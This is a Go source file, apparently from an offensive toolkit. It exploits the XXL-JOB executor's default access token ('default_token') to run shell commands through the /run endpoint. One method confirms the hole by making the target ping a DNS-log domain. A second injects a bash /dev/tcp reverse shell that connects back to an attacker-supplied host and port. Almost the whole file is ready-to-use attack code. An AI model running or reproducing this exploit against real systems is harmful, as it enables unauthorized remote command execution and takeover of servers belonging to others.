package pocs

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math"
	"net/http"
	"strconv"
	"strings"
	"time"
	newclient "xxl-job/newClient"
)

type AccessTokenRce struct {
	Target           string
	Proxy            string
	Timeout          int
	Headers          map[string]string
	Result_Token_500 Result_Token_500
	Result_Token_200 Result_Token_200
}

type Result_Token_500 struct {
	Code int
	Msg  string
}

type Result_Token_200 struct {
	Code int
}

func NewAccessTokenRce(target, proxy string) *AccessTokenRce {
	return &AccessTokenRce{
		Target:  target,
		Proxy:   proxy,
		Timeout: 20,
		Headers: map[string]string{
			"User-Agent":           newclient.ReturnUA(),
			"Accept-Encoding":      "gzip, deflate",
			"Content-Type":         "application/json",
			"X-Requested-With":     "XMLHttpRequest",
			"XXL-JOB-ACCESS-TOKEN": "default_token",
		},
		Result_Token_500: Result_Token_500{},
		Result_Token_200: Result_Token_200{},
	}
}

func (a *AccessTokenRce) Check(dnslog string) {
	timestamp := time.Now().UnixNano() / int64(time.Millisecond)
	times := int64(math.Round(float64(timestamp) * 1000))
	timeStr := strconv.Itoa(int(times))
	cmd := fmt.Sprintf("ping xxl-job-token.%s", dnslog)
	// powershell、Shell、Python、NodeJS、PHP、java
	data := struct {
		JobId                 int    `json:"jobId"`
		ExecutorHandler       string `json:"executorHandler"`
		ExecutorParams        string `json:"executorParams"`
		ExecutorBlockStrategy string `json:"executorBlockStrategy"`
		ExecutorTimeout       int    `json:"executorTimeout"`
		LogId                 int    `json:"logId"`
		LogDateTime           int64  `json:"logDateTime"`
		GlueType              string `json:"glueType"`
		GlueSource            string `json:"glueSource"`
		GlueUpdatetime        string `json:"glueUpdatetime"`
		BroadcastIndex        int    `json:"broadcastIndex"`
		BroadcastTotal        int    `json:"broadcastTotal"`
	}{
		JobId:                 123,
		ExecutorHandler:       "demoJobHandler",
		ExecutorParams:        "demoJobHandler",
		ExecutorBlockStrategy: "COVER_EARLY",
		ExecutorTimeout:       0,
		LogId:                 1,
		LogDateTime:           1586629003729,
		GlueType:              "GLUE_SHELL",
		GlueSource:            cmd,
		GlueUpdatetime:        timeStr,
		BroadcastIndex:        0,
		BroadcastTotal:        0,
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error marshalling JSON:", err)
		return
	}

	var url string
	if strings.HasSuffix(a.Target, "/") {
		url = a.Target + "run"
	} else {
		url = a.Target + "/run"
	}

	response, err := newclient.SendRequest("POST", url, a.Proxy, a.Timeout, nil, a.Headers)
	if err != nil {
		return
	}
	defer response.Body.Close()

	decoder := json.NewDecoder(response.Body)
	if err := decoder.Decode(&a.Result_Token_500); err != nil {
		return
	}
	if response.StatusCode == http.StatusOK {
		if a.Result_Token_500.Code == 500 && strings.Contains(a.Result_Token_500.Msg, "xxl.job") {
			r := fmt.Sprintf("[+] %s The target machine did indeed use xxl-job!", a.Target)
			fmt.Println(r)
			fmt.Println("[+] Prepare to attempt dnslog detection of xxl-job default_token command execution vulnerability!")
			resp, err := newclient.SendRequest("POST", url, a.Proxy, a.Timeout, bytes.NewReader(jsonData), a.Headers)
			if err != nil {
				return
			}
			decoder := json.NewDecoder(resp.Body)
			if err := decoder.Decode(&a.Result_Token_200); err != nil {
				return
			}
			if a.Result_Token_200.Code == 200 {
				r := fmt.Sprintf("[*] DNSLOG detection has been executed, please return to the DNSLOG platform [%s] to view!", dnslog)
				fmt.Println(r)
			} else {
				fmt.Println("[-] DNSLOG detection failed, vulnerability may not exist!")
			}
		} else {
			r := fmt.Sprintf("[-] %s The target machine is not using xxl-job!", a.Target)
			fmt.Println(r)
		}
	} else {
		r := fmt.Sprintf("[-] %s The target machine is not using xxl-job, or default_token does not exist!", a.Target)
		fmt.Println(r)
	}
}

func (a *AccessTokenRce) ReveseShell(lhost, lport string) {
	cmd := fmt.Sprintf("bash -i>& /dev/tcp/%s/%s 0>&1", lhost, lport)

	timestamp := time.Now().UnixNano() / int64(time.Millisecond)
	times := int64(math.Round(float64(timestamp) * 1000))
	timeStr := strconv.Itoa(int(times))

	data := struct {
		JobId                 int    `json:"jobId"`
		ExecutorHandler       string `json:"executorHandler"`
		ExecutorParams        string `json:"executorParams"`
		ExecutorBlockStrategy string `json:"executorBlockStrategy"`
		ExecutorTimeout       int    `json:"executorTimeout"`
		LogId                 int    `json:"logId"`
		LogDateTime           int64  `json:"logDateTime"`
		GlueType              string `json:"glueType"`
		GlueSource            string `json:"glueSource"`
		GlueUpdatetime        string `json:"glueUpdatetime"`
		BroadcastIndex        int    `json:"broadcastIndex"`
		BroadcastTotal        int    `json:"broadcastTotal"`
	}{
		JobId:                 123,
		ExecutorHandler:       "demoJobHandler",
		ExecutorParams:        "demoJobHandler",
		ExecutorBlockStrategy: "COVER_EARLY",
		ExecutorTimeout:       0,
		LogId:                 1,
		LogDateTime:           1586629003729,
		GlueType:              "GLUE_SHELL",
		GlueSource:            cmd,
		GlueUpdatetime:        timeStr,
		BroadcastIndex:        0,
		BroadcastTotal:        0,
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error marshalling JSON:", err)
		return
	}

	var url string
	if strings.HasSuffix(a.Target, "/") {
		url = a.Target + "run"
	} else {
		url = a.Target + "/run"
	}

	response, err := newclient.SendRequest("POST", url, a.Proxy, a.Timeout, nil, a.Headers)
	if err != nil {
		return
	}
	defer response.Body.Close()

	decoder := json.NewDecoder(response.Body)
	if err := decoder.Decode(&a.Result_Token_500); err != nil {
		return
	}
	if response.StatusCode == http.StatusOK {
		if a.Result_Token_500.Code == 500 && strings.Contains(a.Result_Token_500.Msg, "xxl.job") {
			r := fmt.Sprintf("[+] %s The target machine did indeed use xxl-job!", a.Target)
			fmt.Println(r)
			fmt.Println("[+] Prepare to try the xxl-job default_token command to execute vulnerability rebound shell!")
			resp, err := newclient.SendRequest("POST", url, a.Proxy, a.Timeout, bytes.NewReader(jsonData), a.Headers)
			if err != nil {
				return
			}
			decoder := json.NewDecoder(resp.Body)
			if err := decoder.Decode(&a.Result_Token_200); err != nil {
				return
			}
			if a.Result_Token_200.Code == 200 {
				r := fmt.Sprintf("[*] Reverse shell command executed. Check results on host %s!", lhost)
				fmt.Println(r)
			} else {
				fmt.Println("[-] Reverse shell command executed Falid")
			}
		} else {
			r := fmt.Sprintf("[-] %s The target machine is not using xxl-job!", a.Target)
			fmt.Println(r)
		}

	} else {
		r := fmt.Sprintf("[-] %s The target machine is not using xxl-job, or default_token does not exist!", a.Target)
		fmt.Println(r)
	}
}
